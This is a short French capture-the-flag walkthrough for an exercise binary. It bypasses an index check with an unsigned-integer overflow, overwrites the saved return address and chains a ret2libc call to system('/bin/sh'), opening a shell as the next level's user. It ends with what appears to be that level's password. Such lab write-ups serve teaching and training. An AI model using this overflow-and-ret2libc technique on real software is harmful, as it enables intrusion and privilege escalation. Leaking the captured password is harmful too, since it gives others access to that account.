tab[0] = 0xffffd458

le saved-eip est a: 0xffffd61c
soit tab[114] sauf que la case appartient a Will !
Le check est "index % 3", index est stocke en tant que Unsigned Int.

On sait que:
sizeof(int) = 4 octets.
Aucun indice en C, mais si on se penche sur l'assembleur, on remarque qu'il est oblige de faire "index * 4" pour aller a la bonne valeur.

114 * 4 = 456

En jouant avec les overflows (voir overflow.c), on trouve ceci:
1073741938 << 2 = 456

_____________________________________
Input command: store
 Number: 1234
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 1234
 Completed read command successfully
 ____________________________________

On est maintenant capable de modifier le saved-eip, il ne nous reste plus qu'a recuperer nos addresses pour ret2libc puis a les retranscir en nombres. 
UINT_MAX: 4294967295

system: 0xf7e6aed0 -> 4159090384
exit: 0xf7e5eb70 -> 4159040368
/bin/sh: 0xf7f897ec -> 4160264172

_____________________________________
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
______________________________________

7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
